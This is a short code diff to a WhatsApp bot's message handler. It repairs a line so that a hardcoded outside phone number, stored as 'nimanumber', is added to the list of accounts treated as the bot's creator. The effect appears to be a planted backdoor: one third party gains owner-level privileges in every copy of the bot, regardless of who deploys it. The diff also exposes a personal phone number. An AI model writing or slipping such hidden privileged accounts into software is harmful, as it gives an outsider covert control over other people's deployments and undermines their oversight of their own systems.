@@ -137,8 +137,8 @@ module.exports = GojoMdNx = async (GojoMdNx, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await GojoMdNx.decodeJid(GojoMdNx.user.id)
-	const nimanumber = "[94719574492]"
-        const isCreator = [botNumber,nimanumber ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+	const nimanumber = "94719574492"
+        const isCreator = [botNumber,nimanumber ,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
